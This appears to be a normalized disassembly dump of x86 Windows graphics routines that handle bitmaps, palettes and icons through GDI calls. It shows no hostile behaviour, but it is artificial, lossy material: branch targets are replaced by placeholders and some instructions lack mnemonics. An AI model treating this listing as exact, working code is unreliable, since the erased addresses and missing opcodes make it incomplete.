push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateBitmap
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_41df95
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call sub_41de20
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
retn
call sub_41de20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e02d
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov esi eax
push 0xcc0020
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call StretchBlt
test ebx ebx
je r-xdata
test esi esi
je r-xdata
push ebx
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
push esi
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
sub_41e038
mov edx eax
dec dx
je r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
retn
sub dx 0x3
je r-xdata
sub dx 0x4
jne r-xdata
xor eax eax
retn
sub_41e06c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
call CreateCompatibleDC
call sub_41dec8
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41e2ec
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
push ebx
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_41dec8
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x2c ]
jne r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp esi [ ebp + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e2f3
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push 0xcc0020
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push r-xdata
push esi
push ebx
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push 0x0
push edi
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
push edi
call SetBkColor
mov [ ebp - 0x20 ] eax
push 0x8800c6
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
push 0x660046
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
push edi
call SetTextColor
mov eax [ ebp - 0x20 ]
push eax
push edi
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_41dec8
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_41e13f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xcc0020
mov eax 0xaa0029
call sub_4067ac
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call MaskBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e2f3
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
sub_41e300
push ebx
push esi
push edi
mov esi eax
mov edi esi
mov edx 0xff
lea eax [ edi + edx * 4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ esi + ecx ]
mov bl [ ecx + 0x2 ]
mov [ eax + 0x2 ] bl
mov bl [ ecx + 0x1 ]
mov [ eax + 0x1 ] bl
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
dec edx
test edx edx
jne r-xdata
mov [ edi + 0x3 ] 0x0
pop edi
pop esi
pop ebx
retn
sub_41e338
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
mov [ esp + 0x4 ] esi
mov edi [ esp ]
mov edi [ edi ]
dec edi
test edi edi
jle r-xdata
mov eax [ esp ]
cmp [ eax ] 0x100
jge r-xdata
mov ecx 0x1
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx 0x100
sub edx [ eax ]
lea edx [ edx + edx * 2 ]
mov eax [ esp ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax ]
xor ecx ecx
call sub_402b04
mov eax [ esp ]
mov [ eax ] 0x100
mov eax [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
lea edx [ ecx + ecx * 2 ]
lea edx [ esi + edx ]
mov bl [ eax + 0x2 ]
mov [ edx + 0x2 ] bl
mov bl [ eax + 0x1 ]
mov [ edx + 0x1 ] bl
mov al [ eax ]
mov [ edx ] al
inc ecx
dec edi
jne r-xdata
sub_41e3b0
push ebp
mov ebp esp
add esp 0xffffffd4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x2c ]
push eax
call GetSystemInfo
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
dec ecx
js r-xdata
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x2c ]
cmp [ eax + 0x20 ] 0x3
je r-xdata
push ebx
mov eax [ edx + ecx * 4 ]
bswap eax
shr eax 0x8
mov [ edx + ecx * 4 ] eax
dec ecx
jns r-xdata
xor ebx ebx
mov eax [ edx + ecx * 4 ]
mov bh al
mov bl ah
shr eax 0x10
shl ebx 0x8
mov bl al
mov [ edx + ecx * 4 ] ebx
dec ecx
jns r-xdata
pop ebx
jmp r-xdata
sub_41e408
push ebp
mov ebp esp
add esp 0xfffffbf8
push ebx
mov [ ebp - 0x408 ] 0x300
mov [ ebp - 0x406 ] 0x10
lea edx [ ebp - 0x404 ]
mov ecx 0x40
call sub_4028c8
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e505
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov ebx eax
cmp ebx 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e50c
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebp - 0x404 ]
push eax
push 0x8
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
cmp [ ebp - 0x3e8 ] 0xc0c0c0
jne r-xdata
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x424 ]
push eax
push 0x8
sub ebx 0x8
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e8 ]
push eax
push 0x1
mov eax ebx
sub eax 0x8
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x420 ]
push eax
push 0x7
sub ebx 0x7
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e4 ]
push eax
push 0x1
push 0x7
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
jmp r-xdata
sub_41e520
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41e5a6
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x68
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
cmp eax 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebx + 0x4 ]
push eax
push 0x8
push 0x0
mov eax [ rw-data ]
push eax
call GetPaletteEntries
movzx eax [ ebx + 0x2 ]
lea eax [ ebx + eax * 4 - 0x1c ]
push eax
push 0x8
push 0x8
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov [ ebp - 0x1 ] 0x1
sub_41e5b8
push ebx
push esi
push edi
add esp 0xfffffbfc
mov edi eax
xor esi esi
mov [ esp ] 0x300
test edi edi
je r-xdata
mov [ esp + 0x2 ] cx
mov eax edx
lea edx [ esp + 0x4 ]
shl ecx 0x2
call sub_4028c8
push 0x0
call CreateCompatibleDC
mov ebx eax
push edi
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
push 0x0
push ebx
call GetDIBColorTable
mov [ esp + 0x2 ] ax
push edi
push ebx
call SelectObject
push ebx
call DeleteDC
jmp r-xdata
mov eax esi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2 ] 0x10
jne r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx edx [ esp + 0x2 ]
lea eax [ esp + 0x4 ]
call sub_41e3b0
mov eax esp
call sub_41e520
test al al
jne r-xdata
mov eax esp
push eax
call CreatePalette
mov esi eax
sub_41e65c
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
test ebx ebx
je r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
lea eax [ edi + 0x1 ]
cmp eax [ esp ]
jge r-xdata
push esi
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
mov eax esi
mov edx [ esp ]
call sub_41e3b0
mov [ esp ] eax
sub_41e6b0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shr [ eax + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_41e058
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0xe ]
call sub_41e038
mov esi eax
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_41e85c
push [ fs : edx ]
mov [ fs : edx ] esp
mov edi [ ebp - 0x4 ]
mov eax edi
add eax 0x28
mov edx esi
shl edx 0x2
add eax edx
mov [ ebp - 0x14 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
push edi
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_41dec8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41e782
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_41ded8
mov [ ebx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e789
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
call sub_41ddcc
sub_41e789
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0x1
mov [ eax + 0xe ] bx
mov eax [ ebp - 0x4 ]
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_41e058
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x2
mov eax [ ebp - 0x4 ]
add eax 0x28
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] 0xffffff
push 0x0
mov ebx [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_41dec8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41e83c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0xc ]
call sub_41ded8
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e843
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_41e878
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov cl [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
sub ecx eax
xor ebx ebx
mov bl [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub ebx [ edx + 0x4 ]
mov esi [ ebp - 0x4 ]
movzx esi [ esi ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov edi eax
mov eax esi
cdq
xor eax edx
sub eax edx
cmp edi eax
jg r-xdata
xor eax eax
jmp r-xdata
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x8 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
cmp esi ecx
jl r-xdata
test ebx ebx
jle r-xdata
mov al 0x1
cmp ebx [ ebp - 0x8 ]
jle r-xdata
sub_41e908
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
shl eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_407910
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_41ebff
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebx ]
or eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
mov [ eax ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
push 0xb
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0xc
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
xor edx edx
push ebp
push sub_41e9f1
push [ fs : edx ]
mov [ fs : edx ] esp
push 0xe
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xc
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax ebx
cmp ax 0x8
jbe r-xdata
call sub_41ddcc
push 0x0
call GetDC
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e9f8
mov eax [ ebp - 0x28 ]
push eax
push 0x0
call ReleaseDC
retn
sub_41e9f8
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x2 ]
call sub_41e86c
mov [ ebp - 0x20 ] eax
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax eax
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
call sub_407910
mov [ ebp - 0x2c ] eax
xor eax eax
push ebp
push sub_41ebdf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x10 ]
sub edx eax
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x8 ]
mov ebx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_41e6b0
lea eax [ ebp - 0x70 ]
push eax
push 0x18
mov eax [ ebp - 0x38 ]
push eax
call GetObjectA
lea eax [ ebp - 0x58 ]
push eax
push 0x18
mov eax [ ebp - 0x34 ]
push eax
call GetObjectA
mov ebx [ ebp - 0x64 ]
imul ebx [ ebp - 0x68 ]
movzx eax [ ebp - 0x60 ]
imul ebx eax
mov eax [ ebp - 0x4c ]
imul [ ebp - 0x50 ]
movzx edx [ ebp - 0x48 ]
imul edx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
add eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_407910
mov [ ebp - 0x30 ] eax
xor eax eax
push ebp
push sub_41ebbc
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebp - 0x30 ]
mov esi [ ebp - 0x30 ]
add esi ebx
push edi
push ebx
mov eax [ ebp - 0x38 ]
push eax
call GetBitmapBits
push esi
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x34 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
push esi
push edi
mov al [ ebp - 0x46 ]
push eax
mov al [ ebp - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
push eax
call CreateIcon
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ebc3
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x30 ]
call sub_4026ec
retn
call sub_41de20
inc esi
dec edi
jne r-xdata
cmp ebx [ ebp - 0x20 ]
jl r-xdata
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
movzx eax [ edx + eax * 8 + 0x2 ]
call sub_41e86c
mov ebx eax
cmp ebx [ ebp - 0x1c ]
jg r-xdata
push ebp
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x24 ]
add eax eax
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax * 8 ]
call sub_41e878
pop ecx
test al al
je r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
sub_41ec10
push ebx
push esi
push edi
add esp 0xffffffac
mov esi ecx
mov ebx edx
xor edx edx
mov [ esp + 0x18 ] edx
push esp
push 0x54
push eax
call GetObjectA
test eax eax
jne r-xdata
cmp eax 0x40
jl r-xdata
call sub_41ddb4
jmp r-xdata
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402b04
mov [ ebx ] 0x28
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
cmp [ esp + 0x18 ] 0x28
jb r-xdata
mov eax esi
sub eax 0x2
je r-xdata
mov [ ebx + 0xe ] 0x1
jmp r-xdata
dec eax
sub eax 0xe
jb r-xdata
push esi
mov edi ebx
lea esi [ esp + 0x1c ]
mov ecx 0xa
[ edi ] [ esi ]
pop esi
jmp r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jae r-xdata
mov [ ebx + 0xe ] 0x4
mov [ ebx + 0x20 ] esi
jmp r-xdata
sub eax 0xf0
jb r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ ebx + 0xe ] 0x8
mov [ ebx + 0x20 ] esi
jmp r-xdata
jmp r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_41e058
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov ax [ esp + 0x12 ]
imul [ esp + 0x10 ]
mov [ ebx + 0xe ] ax
sub_41ecf4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx edx
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_41ec10
mov ax [ ebp - 0x1a ]
cmp ax 0x8
jbe r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
jne r-xdata
mov [ ebx ] 0x28
test [ ebp - 0x18 ] 0x3
je r-xdata
mov eax edx
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
mov ecx eax
mov eax 0x1
shl eax cl
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx ] 0xc
jmp r-xdata
sub_41ed60
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov edx ebx
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_41ec10
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41edfd
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
push 0x0
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call GetDIBits
test eax eax
setne [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ee04
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
sub_41ee34
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
lea eax [ ebp - 0x2a ]
xor ecx ecx
mov edx 0x6
call sub_402b04
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x10
call sub_402b04
lea eax [ ebp - 0x44 ]
push eax
push esi
call GetIconInfo
call sub_41ee28
xor edx edx
push ebp
push sub_41f022
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x2
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_41ecf4
push 0x10
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x34 ]
call sub_41ecf4
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_41effb
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
call sub_407910
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
call sub_407910
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
call sub_407910
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
call sub_407910
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
push 0x2
mov ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x38 ]
call sub_41ed60
mov eax [ ebp - 0x24 ]
push eax
push 0x10
mov ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x34 ]
call sub_41ed60
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x26 ] 0x1
lea edx [ ebp - 0x2a ]
mov ecx 0x6
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov esi [ ebp - 0x20 ]
mov eax esi
mov dl [ eax + 0x4 ]
mov [ ebp - 0x54 ] dl
mov dl [ eax + 0x8 ]
mov [ ebp - 0x53 ] dl
mov dx [ eax + 0xc ]
imul dx [ eax + 0xe ]
mov [ ebp - 0x52 ] dx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x14 ]
